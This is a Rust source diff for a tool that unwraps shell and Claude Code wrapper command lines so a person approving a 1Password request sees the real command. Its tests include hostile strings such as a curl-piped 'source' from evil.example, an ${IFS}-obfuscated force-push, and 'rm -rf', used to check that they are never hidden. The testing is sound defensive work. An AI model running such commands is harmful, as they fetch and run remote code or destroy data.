@@ -77,12 +77,14 @@ pub enum Sketch {
     Asking,
 }
 
-/// The band: two lines (the first bold) with marked words ([`marked`]), and its picture.
+/// The band: two lines (the first bold) with marked words ([`marked`]), and its picture. `keep`: the band says what the
+/// window said before it had a band (while 1Password asks), so a window too tall for its screen keeps it.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Band {
     pub title: String,
     pub line: String,
     pub sketch: Sketch,
+    pub keep: bool,
 }
 
 /// Everything a window shows, top to bottom (design §4.2, §4.3). The buttons, the references, the orange line and the
@@ -315,52 +317,110 @@ fn rest_line(s: &str, rest: &[Token]) -> Option<String> {
     }
 }
 
-/// One shell started to run one command (design §4.7, rule 1): the command it runs, when the line has exactly that
-/// shape. With `cut`, the line may end inside the command string.
-fn unwrap_shell(s: &str, cut: bool) -> Option<String> {
-    let words = lex(s, cut)?;
+/// What came off a root's command line (design §4.7): the command a person reads, and the line with that command
+/// replaced by `…`. The window shows the first in its box and the second under it, so that the two show the whole line.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Unwrapped {
+    pub command: String,
+    pub frame: String,
+}
+
+/// An option of a POSIX shell that runs nothing by itself: a group of `-c`, `-l`, `-i`, `-e`, `-x`, `-u`, or `--login`,
+/// `--noprofile`, `--norc`. Whether it holds `-c`.
+fn shell_option(v: &str) -> Option<bool> {
+    if matches!(v, "--login" | "--noprofile" | "--norc") {
+        return Some(false);
+    }
+    let group = v.strip_prefix('-').filter(|g| !g.is_empty())?;
+    group
+        .chars()
+        .all(|c| "cliexu".contains(c))
+        .then(|| group.contains('c'))
+}
+
+/// The execution policies of PowerShell (`-ExecutionPolicy <policy>`).
+const POLICIES: [&str; 7] = [
+    "Bypass",
+    "RemoteSigned",
+    "Unrestricted",
+    "AllSigned",
+    "Restricted",
+    "Default",
+    "Undefined",
+];
+
+/// The command a person reads in a root's command line (design §4.7): only the root's own arguments are read as
+/// arguments (what a shell runs is code, and is shown as it is), and a wrapper comes off only when it matches exactly:
+///
+/// 1. a shell started to run one command: `bash`, `sh`, `zsh`, `dash`, `fish` with options that run nothing themselves,
+///    `-c` among them, then the command string and nothing after it; `cmd.exe` with `/c` (after `/d`, `/s`, `/q` only);
+///    `pwsh` or `powershell` with `-Command` (or `-c`) after `-NoProfile`, `-NonInteractive`, `-NoLogo` and
+///    `-ExecutionPolicy <policy>`;
+/// 2. inside a POSIX shell's command string, Claude Code's wrapper of its Bash tool ([`unwrap_claude`]).
+///
+/// `None` when nothing comes off: the line is shown as it is, also one whose quoting does not close. A line that
+/// op-reason cut (it ends with `…`) gives a command only from Claude Code's `eval`, up to the cut.
+pub fn root_command(cmd: &str) -> Option<Unwrapped> {
+    let cut = cmd.ends_with('…');
+    let words = lex(cmd, cut)?;
     let (program, args) = words.split_first()?;
     match base_name(&program.value).as_str() {
         "bash" | "sh" | "zsh" | "dash" | "fish" => {
+            // the shell reads options until the first other word, which `-c` makes the command string
             let mut command = false;
-            let mut rest = Vec::new();
-            for a in args {
-                let v = &a.value;
-                if v.len() > 1 && v.starts_with('-') && !v.starts_with("--") {
-                    command |= v.contains('c');
-                } else if v.starts_with("--") && rest.is_empty() {
-                    // --login, --norc …: options without values
-                } else {
-                    rest.push(a);
+            let mut at = 0;
+            while let Some(a) = args.get(at) {
+                if !a.value.starts_with('-') {
+                    break;
                 }
+                command |= shell_option(&a.value)?;
+                at += 1;
             }
-            match rest.as_slice() {
-                [one] if command => Some(one.value.clone()),
-                _ => None,
+            let [string] = &args[at..] else {
+                return None;
+            };
+            if !command {
+                return None;
+            }
+            let head = &cmd[..string.start];
+            match unwrap_claude(&string.value) {
+                Some(inner) => Some(Unwrapped {
+                    command: inner.command,
+                    frame: format!("{head}\"{}", inner.frame) + if cut { "" } else { "\"" },
+                }),
+                None if cut || string.value.trim().is_empty() => None,
+                None => Some(Unwrapped {
+                    command: string.value.clone(),
+                    frame: format!("{head}\"…\""),
+                }),
             }
         }
-        "cmd" => {
+        "cmd" if !cut => {
             let at = args
                 .iter()
                 .position(|a| a.value.eq_ignore_ascii_case("/c"))?;
-            let before_ok = args[..at].iter().all(|a| {
+            let before = args[..at].iter().all(|a| {
                 ["/d", "/s", "/q"]
                     .iter()
                     .any(|o| a.value.eq_ignore_ascii_case(o))
             });
-            if !before_ok {
-                return None;
-            }
-            rest_line(s, &args[at + 1..])
+            before.then_some(())?;
+            rest_unwrapped(cmd, &args[at + 1..])
         }
-        "pwsh" | "powershell" => {
-            let mut i = 0;
-            while i < args.len() {
-                let v = args[i].value.to_ascii_lowercase();
-                match v.as_str() {
-                    "-noprofile" | "-noninteractive" | "-nologo" => i += 1,
-                    "-executionpolicy" => i += 2,
-                    "-command" | "-c" => return rest_line(s, args.get(i + 1..)?),
+        "pwsh" | "powershell" if !cut => {
+            let mut at = 0;
+            while let Some(a) = args.get(at) {
+                match a.value.to_ascii_lowercase().as_str() {
+                    "-noprofile" | "-noninteractive" | "-nologo" => at += 1,
+                    "-executionpolicy" => {
+                        let policy = args.get(at + 1)?;
+                        POLICIES
+                            .iter()
+                            .any(|p| policy.value.eq_ignore_ascii_case(p))
+                            .then_some(())?;
+                        at += 2;
+                    }
+                    "-command" | "-c" => return rest_unwrapped(cmd, &args[at + 1..]),
                     _ => return None,
                 }
             }
@@ -368,6 +428,21 @@ fn unwrap_shell(s: &str, cut: bool) -> Option<String> {
         }
         _ => None,
     }
+}
+
+/// The command after `cmd.exe /c` or `pwsh -Command`: the rest of the line, shown as it is.
+fn rest_unwrapped(cmd: &str, rest: &[Token]) -> Option<Unwrapped> {
+    let first = rest.first()?;
+    let command = rest_line(cmd, rest).filter(|c| !c.trim().is_empty())?;
+    let quoted = rest.len() == 1 && cmd[first.start..].starts_with('"');
+    Some(Unwrapped {
+        command,
+        frame: format!(
+            "{}{}",
+            &cmd[..first.start],
+            if quoted { "\"…\"" } else { "…" }
+        ),
+    })
 }
 
 /// Splits `s` at `sep` outside quotes, as a POSIX shell reads them (single quotes, double quotes, a backslash outside
@@ -399,7 +474,8 @@ fn split_outside_quotes<'s>(s: &'s str, sep: &str) -> Option<Vec<&'s str>> {
                 In::Plain if c == b'\\' => escaped = true,
                 In::Plain if c == b'\'' => state = In::Single,
                 In::Plain if c == b'"' => state = In::Double,
-                In::Plain if s[i..].starts_with(sep) => {
+                // compared as bytes: `i` may be inside a character that is not ASCII
+                In::Plain if b[i..].starts_with(sep.as_bytes()) => {
                     parts.push(&s[from..i]);
                     i += sep.len();
                     from = i;
@@ -460,12 +536,27 @@ fn shell_name(q: &str) -> bool {
         })
 }
 
-/// A part of Claude Code's wrapper that only prepares the shell (design §4.7, rule 2): reading its snapshot, turning
-/// `extglob` off, dropping an alias or a function, writing the directory afterwards.
+/// A path without anything a shell would expand or run: no spaces, quotes, `$`, redirections, globs or groups.
+fn plain_path(p: &str) -> bool {
+    !p.is_empty()
+        && p.chars()
+            .all(|c| !c.is_whitespace() && !"|&;<>()$`\"'*?[]{}!#=%\\".contains(c))
+}
+
+/// Claude Code's snapshot of the shell: `…/.claude/shell-snapshots/snapshot-….sh`, or the older
+/// `/tmp/claude-shell-snapshot`.
+fn snapshot_path(p: &str) -> bool {
+    plain_path(p)
+        && (p == "/tmp/claude-shell-snapshot"
+            || (p.contains("/.claude/shell-snapshots/snapshot-") && p.ends_with(".sh")))
+}
+
+/// A part of Claude Code's wrapper that only prepares the shell (design §4.7, rule 2), word for word: reading its
+/// snapshot, turning `extglob` off, dropping an alias and a function of one name, writing the directory afterwards.
 fn harmless(seg: &str) -> bool {
     let w: Vec<&str> = seg.split(' ').collect();
     match w.as_slice() {
-        ["source", f] | ["source", f, "2>/dev/null", "||", "true"] => !f.is_empty(),
+        ["source", f] | ["source", f, "2>/dev/null", "||", "true"] => snapshot_path(f),
         ["shopt", "-u", "extglob", "2>/dev/null", "||", "true"]
         | [
             "\\builtin",
@@ -476,7 +567,7 @@ fn harmless(seg: &str) -> bool {
             "||",
             "true",
         ] => true,
-        ["pwd", "-P", ">|", f] => !f.is_empty(),
+        ["pwd", "-P", ">|", f] => plain_path(f) && f.ends_with("-cwd"),
         [
             "{",
             "\\builtin",
@@ -493,18 +584,22 @@ fn harmless(seg: &str) -> bool {
             "2>&1",
             "||",
             "true",
-        ] => {
-            a.strip_suffix(';').is_some_and(shell_name)
-                && b.strip_suffix(';').is_some_and(shell_name)
-        }
+        ] => a == b && a.strip_suffix(';').is_some_and(shell_name),
         _ => false,
     }
 }
 
+/// What came off a command string.
+struct Inner {
+    command: String,
+    /// The string with the command replaced by `…`.
+    frame: String,
+}
+
 /// Claude Code's wrapper of its Bash tool (design §4.7, rule 2): parts joined by ` && ` that only prepare the shell
-/// ([`harmless`]) and one `eval '<command>'` (optionally ` \< /dev/null`): the command inside the quotes. A line cut
+/// ([`harmless`]) and one `eval '<command>'` (optionally ` \< /dev/null`): the command inside the quotes. A string cut
 /// inside the quotes gives the command up to the cut and `…`.
-fn unwrap_claude(s: &str) -> Option<String> {
+fn unwrap_claude(s: &str) -> Option<Inner> {
     // the eval's quotes may be cut (a line cut by op-reason): only what comes before the eval is split
     let start = if s.starts_with("eval '") {
         0
@@ -519,48 +614,26 @@ fn unwrap_claude(s: &str) -> Option<String> {
     {
         return None;
     }
+    let before = &s[..start];
     match single_quoted(s[start..].strip_prefix("eval '")?)? {
-        Quoted::Cut(value) => Some(format!("{value}…")),
+        Quoted::Cut(value) => Some(Inner {
+            command: format!("{value}…"),
+            frame: format!("{before}eval '…"),
+        }),
         Quoted::Closed(value, after) => {
-            let after = after.strip_prefix(r" \< /dev/null").unwrap_or(after);
-            if after.is_empty() {
-                return Some(value);
-            }
-            let tail = after.strip_prefix(" && ")?;
-            split_outside_quotes(tail, " && ")?
-                .iter()
-                .all(|p| harmless(p))
-                .then_some(value)
+            let tail = after.strip_prefix(r" \< /dev/null").unwrap_or(after);
+            let ok = tail.is_empty()
+                || tail
+                    .strip_prefix(" && ")
+                    .and_then(|t| split_outside_quotes(t, " && "))
+                    .is_some_and(|parts| parts.iter().all(|p| harmless(p)));
+            ok.then(|| Inner {
+                command: value,
+                frame: format!("{before}eval '…'{after}"),
+            })
+            .filter(|i| !i.command.trim().is_empty())
         }
     }
-}
-
-/// How many wrappers may come off one line.
-const UNWRAP_MAX: usize = 4;
-
-/// The command a person reads in a root's command line (design §4.7): the shells started to run one command and Claude
-/// Code's wrapper taken off, when they match exactly. `None` when nothing came off: the line is shown as it is, also one
-/// whose quoting does not close. A line that op-reason cut (it ends with `…`) gives the command only from Claude Code's
-/// `eval`, up to the cut and `…`.
-pub fn root_command(cmd: &str) -> Option<String> {
-    let cut = cmd.ends_with('…');
-    let shells = |mut s: String| {
-        for _ in 0..UNWRAP_MAX {
-            match unwrap_shell(&s, cut) {
-                Some(inner) if !inner.trim().is_empty() => s = inner,
-                _ => break,
-            }
-        }
-        s
-    };
-    let outer = shells(cmd.to_owned());
-    let found = match unwrap_claude(&outer).filter(|i| !i.trim().is_empty()) {
-        Some(inner) if inner.ends_with('…') => inner,
-        Some(inner) => shells(inner),
-        None if cut => return None,
-        None => outer,
-    };
-    (found != cmd).then_some(found)
 }
 
 /// Whether a command line holds `&&`, `||`, `;` or `|` outside quotes: more than one program.
@@ -769,45 +842,39 @@ mod tests {
         assert!(color_words("").is_empty());
     }
 
+    /// The command and the frame of a root command line that unwraps.
+    fn unwrap(cmd: &str) -> (String, String) {
+        let u = root_command(cmd).unwrap_or_else(|| panic!("nothing came off {cmd}"));
+        (u.command, u.frame)
+    }
+
     #[test]
     fn the_root_commands_of_claude_code() {
         // tests/cases/roots.json, rule claude, as cmdline::display shows the roots
         assert_eq!(
-            root_command(r#"bash -c -l "source /tmp/claude-shell-snapshot && eval 'git push'""#)
-                .as_deref(),
-            Some("git push")
-        );
-        assert_eq!(
-            root_command(
-                r#"cmd.exe /d /s /c "pwsh -NoProfile -NonInteractive -Command \"ssh-add -l\"""#
+            unwrap(r#"bash -c -l "source /tmp/claude-shell-snapshot && eval 'git push'""#),
+            (
+                "git push".to_owned(),
+                r#"bash -c -l "source /tmp/claude-shell-snapshot && eval '…'""#.to_owned()
             )
-            .as_deref(),
-            Some("ssh-add -l")
         );
         assert_eq!(
-            root_command(r#"bash.exe -c -l "ssh host""#).as_deref(),
-            Some("ssh host")
+            unwrap(r#"cmd.exe /d /s /c "pwsh -NoProfile -NonInteractive -Command \"ssh-add -l\"""#),
+            (
+                r#"pwsh -NoProfile -NonInteractive -Command "ssh-add -l""#.to_owned(),
+                r#"cmd.exe /d /s /c "…""#.to_owned()
+            ),
+            "only the root's own arguments come off: what cmd.exe runs is shown as it is"
         );
+        assert_eq!(unwrap(r#"bash.exe -c -l "ssh host""#).0, "ssh host");
         assert_eq!(root_command("SSH.EXE host"), None);
-        // the screenshots' call, and Claude Code's whole wrapper
+        // the screenshots' call
         assert_eq!(
-            root_command(r#"bash -c -l "git push origin fix/login""#).as_deref(),
-            Some("git push origin fix/login")
-        );
-        assert_eq!(
-            root_command(
-                r#"bash -c -l "source ~/.claude/shell-snapshots/s.sh && eval 'git push origin main' \< /dev/null && pwd -P >| /tmp/c-cwd""#
+            unwrap(r#"bash -c -l "git push origin fix/login""#),
+            (
+                "git push origin fix/login".to_owned(),
+                r#"bash -c -l "…""#.to_owned()
             )
-            .as_deref(),
-            Some("git push origin main")
-        );
-        assert_eq!(
-            root_command(
-                r#"bash -c -l "source s.sh && eval 'git commit -m '\''fix it'\''' \< /dev/null""#
-            )
-            .as_deref(),
-            Some("git commit -m 'fix it'"),
-            "a quote inside the eval"
         );
     }
 
@@ -825,53 +892,102 @@ mod tests {
 
     #[test]
     fn the_root_command_of_claude_codes_wrapper_now() {
+        let (command, frame) = unwrap(&claude_now("git push origin main"));
+        assert_eq!(command, "git push origin main");
         assert_eq!(
-            root_command(&claude_now("git push origin main")).as_deref(),
-            Some("git push origin main")
+            frame,
+            claude_now("…"),
+            "the frame is the whole line with the command as …"
         );
         assert_eq!(
-            root_command(&claude_now(r#"echo '\"'\"'hi'\"'\"'"#)).as_deref(),
-            Some("echo 'hi'"),
+            unwrap(&claude_now(r#"echo '\"'\"'hi'\"'\"'"#)).0,
+            "echo 'hi'",
             "a quote inside the eval, as this wrapper writes it (displayed with escaped double quotes)"
         );
         assert_eq!(
-            root_command(&claude_now("cd a && git push")).as_deref(),
-            Some("cd a && git push"),
+            unwrap(r#"bash -c -l "source /tmp/claude-shell-snapshot && eval 'git commit -m '\''fix it'\''' \< /dev/null""#).0,
+            "git commit -m 'fix it'",
+            "a quote as the older wrapper writes it"
+        );
+        assert_eq!(
+            unwrap(&claude_now("cd a && git push")).0,
+            "cd a && git push",
             "&& inside the eval"
         );
         let mut cut = claude_now("git log --oneline --decorate --graph");
         cut.truncate(cut.find("--decorate").unwrap() + "--decorate".len());
         cut.push('…');
+        let (command, frame) = unwrap(&cut);
         assert_eq!(
-            root_command(&cut).as_deref(),
-            Some("git log --oneline --decorate…"),
+            command, "git log --oneline --decorate…",
             "a line cut inside the eval: the command up to the cut"
         );
+        assert!(frame.ends_with("eval '…"), "{frame}");
         let mut early = claude_now("git push");
         early.truncate(early.find("shopt").unwrap());
         early.push('…');
         assert_eq!(root_command(&early), None, "a line cut before the eval");
         let unknown = claude_now("git push")
             .replace(r"\builtin shopt -u extglob 2>/dev/null || true", "rm -rf x");
+        let (command, _) = unwrap(&unknown);
         assert!(
-            root_command(&unknown)
-                .is_some_and(|s| s.starts_with("source ") && s.contains("rm -rf x")),
+            command.starts_with("source ") && command.contains("rm -rf x"),
             "an unknown part: the shell's whole command string"
         );
     }
 
     #[test]
-    fn a_root_command_is_never_cut_to_a_part() {
+    fn what_runs_is_never_hidden() {
+        // shell code is not read as arguments: what follows the command inside the eval is shown with it
+        let sneaky = r#"bash -c \"git push origin fix/login\" -x;git${IFS}push${IFS}-f${IFS}origin${IFS}HEAD:main"#;
+        let (command, _) = unwrap(&claude_now(sneaky));
+        assert!(command.contains("HEAD:main"), "{command}");
+        // a part of the wrapper that runs something of its own: the whole string
+        for part in [
+            "source <(curl${IFS}-s${IFS}https://evil.example/x)",
+            "source ./evil.sh",
+            "source /home/u/.claude/shell-snapshots/snapshot-x.sh;evil",
+            "source /home/u/.claude/shell-snapshots/snapshot-x.sh || evil",
+            "pwd -P >| /tmp/claude-1-cwd;evil",
+            r"{ \builtin unalias -- 'which'; \builtin unset -f -- 'ls'; } >/dev/null 2>&1 || true",
+        ] {
+            let line = format!(r#"bash -c "{part} && eval 'git push origin fix/login'""#);
+            let (command, _) = unwrap(&line);
+            assert!(command.starts_with(part), "{part}: {command}");
+        }
+        // a snapshot that matches comes off the box, but stays in the frame under it
+        let (command, frame) = unwrap(
+            r#"bash -c "source /home/u/.claude/shell-snapshots/snapshot-evil.sh && eval 'git push'""#,
+        );
+        assert_eq!(command, "git push");
+        assert!(frame.contains("snapshot-evil.sh"), "{frame}");
+        // the root's own arguments: options first, only those that run nothing, and nothing after the string
+        assert_eq!(root_command(r#"bash "git push origin fix/login" -c"#), None);
+        assert_eq!(root_command(r#"bash -o pipefail -c "x""#), None);
+        assert_eq!(root_command(r#"bash --x -c "git status""#), None);
+        assert_eq!(root_command(r#"bash -c "x" extra"#), None);
         assert_eq!(
-            root_command(r#"bash -c "x" extra"#),
+            root_command(r#"pwsh -ExecutionPolicy x -Command "git status""#),
+            None
+        );
+        assert_eq!(
+            unwrap(r#"pwsh -ExecutionPolicy Bypass -Command "git status""#).0,
+            "git status"
+        );
+        assert_eq!(root_command(r#"pwsh -NoProfile -File x.ps1"#), None);
+        assert_eq!(
+            root_command(r#"cmd.exe /k "git push""#),
             None,
-            "more after the command string"
+            "/k keeps the shell"
         );
         assert_eq!(
-            root_command(r#"bash -c "source a && eval 'x' && rm y""#).as_deref(),
-            Some("source a && eval 'x' && rm y"),
-            "a wrapper with more after it: the shell's whole command string"
+            unwrap("cmd.exe /c git push origin main"),
+            ("git push origin main".to_owned(), "cmd.exe /c …".to_owned())
         );
+    }
+
+    #[test]
+    fn a_root_command_shown_as_it_is() {
         assert_eq!(
             root_command(r#"bash -c -l "git push origin fix/lo…"#),
             None,
@@ -884,20 +1000,38 @@ mod tests {
         );
         assert_eq!(root_command("git pull --rebase"), None);
         assert_eq!(root_command("bash"), None);
-        assert_eq!(
-            root_command(r#"cmd.exe /k "git push""#),
-            None,
-            "/k keeps the shell"
-        );
-        assert_eq!(
-            root_command(r#"pwsh -NoProfile -File x.ps1"#),
-            None,
-            "a script is not a command string"
-        );
-        assert_eq!(
-            root_command("cmd.exe /c git push origin main").as_deref(),
-            Some("git push origin main")
-        );
+        assert_eq!(root_command(r#"bash -c """#), None, "an empty command");
+    }
+
+    #[test]
+    fn no_line_makes_it_panic() {
+        let lines = [
+            claude_now("git push origin main"),
+            claude_now("echo 日本語 && git push"),
+            r#"bash -c "source /c/Users/太郎/.claude/shell-snapshots/snapshot-bash-1-x.sh 2>/dev/null || true && eval 'git push' && pwd -P >| /tmp/claude-…-cwd""#.to_owned(),
+            r#"cmd.exe /d /s /c "pwsh -NoProfile -Command \"ssh-add -l\"""#.to_owned(),
+            "op inject -i \"C:\\Users\\me\\app.env.tpl\" -o .env".to_owned(),
+            "ssh.exe 太郎@例え.jp \"echo '🙂'\"".to_owned(),
+        ];
+        for line in &lines {
+            let ends: Vec<usize> = line
+                .char_indices()
+                .map(|(i, _)| i)
+                .chain([line.len()])
+                .collect();
+            for end in ends {
+                let mut cut = line[..end].to_owned();
+                cut.push('…');
+                for s in [&line[..end], cut.as_str()] {
+                    let _ = root_command(s);
+                    let _ = color_words(s);
+                    let _ = program_name(s);
+                    let _ = marked(s);
+                }
+            }
+        }
+        let jp = r#"bash -c "source /c/Users/太郎/.claude/shell-snapshots/snapshot-bash-1-x.sh 2>/dev/null || true && eval 'git push'""#;
+        assert_eq!(unwrap(jp).0, "git push", "a home that is not ASCII");
     }
 
     #[test]
